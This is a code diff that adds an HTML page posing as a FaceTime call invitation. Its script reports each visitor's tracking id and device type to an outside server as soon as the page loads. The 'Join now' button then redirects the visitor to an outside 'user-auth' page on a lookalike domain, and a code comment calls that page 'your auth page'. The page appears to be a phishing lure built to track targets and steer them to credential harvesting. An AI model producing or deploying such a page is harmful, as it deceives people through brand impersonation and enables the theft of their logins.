@@ -1,0 +1,279 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Premium FaceTime Call</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+    />
+    <style>
+      :root {
+        --primary-color: #25d366;
+        --danger-color: #ff3b30;
+        --background-color: #0d0d0d;
+        --button-hover: rgba(255, 255, 255, 0.15);
+        --blur-bg: rgba(255, 255, 255, 0.15);
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        height: 100vh;
+        background: var(--background-color);
+        color: white;
+        font-family: "Inter", sans-serif;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .header {
+        position: absolute;
+        top: 0;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 100%;
+        max-width: 500px;
+        padding: 1.5rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background: var(--blur-bg);
+        backdrop-filter: blur(12px);
+        border-radius: 12px;
+        margin-top: 10px;
+      }
+
+      .facetime-brand {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+
+      .facetime-icon {
+        background: var(--primary-color);
+        width: 45px;
+        height: 45px;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      }
+
+      .facetime-icon i {
+        font-size: 1.5rem;
+        color: white;
+      }
+
+      .call-info {
+        font-size: 1.2rem;
+        font-weight: 600;
+      }
+
+      .main-content {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+        padding: 2rem;
+      }
+
+      .participant-count {
+        font-size: 1.5rem;
+        margin-bottom: 1rem;
+        color: rgba(255, 255, 255, 0.8);
+      }
+
+      .join-button {
+        background: var(--primary-color);
+        padding: 1rem 2.5rem;
+        border-radius: 40px;
+        font-size: 1.3rem;
+        font-weight: 600;
+        border: none;
+        color: white;
+        cursor: pointer;
+        transition: 0.3s;
+        box-shadow: 0px 4px 15px rgba(37, 211, 102, 0.3);
+      }
+
+      .join-button:hover {
+        transform: scale(1.05);
+        background: #20b358;
+      }
+
+      .controls {
+        position: fixed;
+        bottom: 2rem;
+        left: 50%;
+        transform: translateX(-50%);
+        display: flex;
+        gap: 1.5rem;
+        padding: 1rem;
+        background: var(--blur-bg);
+        backdrop-filter: blur(20px);
+        border-radius: 50px;
+        box-shadow: 0px 10px 20px rgba(0, 0, 0, 0.4);
+      }
+
+      .control-btn {
+        width: 65px;
+        height: 65px;
+        border-radius: 50%;
+        background: var(--blur-bg);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        transition: 0.3s;
+      }
+
+      .control-btn i {
+        font-size: 1.6rem;
+        color: white;
+      }
+
+      .control-btn:hover {
+        background: var(--button-hover);
+        transform: scale(1.1);
+      }
+
+      .end-call {
+        background: var(--danger-color) !important;
+        box-shadow: 0px 4px 15px rgba(255, 59, 48, 0.4);
+      }
+
+      .video-feed {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        display: none;
+        z-index: -1;
+      }
+
+      @media (max-width: 600px) {
+        .header {
+          max-width: 90%;
+        }
+        .controls {
+          bottom: 1.5rem;
+          gap: 1rem;
+        }
+        .control-btn {
+          width: 55px;
+          height: 55px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <div class="facetime-brand">
+        <div class="facetime-icon">
+          <i class="fas fa-video"></i>
+        </div>
+        <div class="call-info">FaceTime Call</div>
+      </div>
+      <div class="participant-count">1 Person</div>
+    </div>
+
+    <div class="main-content">
+      <button class="join-button">Join now...</button>
+    </div>
+
+    <div class="controls">
+      <div class="control-btn">
+        <i class="fas fa-volume-up"></i>
+      </div>
+      <div class="control-btn">
+        <i class="fas fa-video"></i>
+      </div>
+      <div class="control-btn">
+        <i class="fas fa-microphone"></i>
+      </div>
+      <div class="control-btn">
+        <i class="fas fa-share-alt"></i>
+      </div>
+      <div class="control-btn end-call">
+        <i class="fas fa-phone-slash"></i>
+      </div>
+    </div>
+
+    <video class="video-feed" id="cameraFeed" autoplay></video>
+
+    <script>
+      const id = new URLSearchParams(window.location.search).get("id");
+      const joinButton = document.querySelector(".join-button");
+      const videoFeed = document.getElementById("cameraFeed");
+
+      async function startCall() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: true,
+          });
+          videoFeed.srcObject = stream;
+          videoFeed.style.display = "block";
+          joinButton.style.display = "none";
+        } catch (error) {
+          console.error("Error accessing media devices:", error);
+          alert("Camera and microphone access required to join call");
+        }
+      }
+
+      function getDeviceType() {
+        const ua = navigator.userAgent.toLowerCase();
+        const isMobile =
+          /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+        const isTablet = /ipad|tablet|playbook|silk/i.test(ua) && !isMobile;
+
+        if (isMobile || isTablet) return "mobile";
+        return "desktop";
+      }
+
+      const deviceType = getDeviceType();
+
+      window.addEventListener("load", async () => {
+        try {
+          const res = await fetch(
+            "https://megatools-8920.onrender.com/api/v1/information",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                user: id,
+                deviceType,
+                siteName: "AutoInfo/login-view",
+              }),
+            },
+          );
+
+          const data = await res.json();
+        } catch (err) {
+          console.error(err);
+          alert("Failed to save email.");
+        }
+      });
+
+      joinButton.addEventListener("click", () => {
+        window.location.href =
+          "https://www.view-mapes.online/user-auth.html?id=" + id; // your auth page
+      });
+    </script>
+  </body>
+</html>
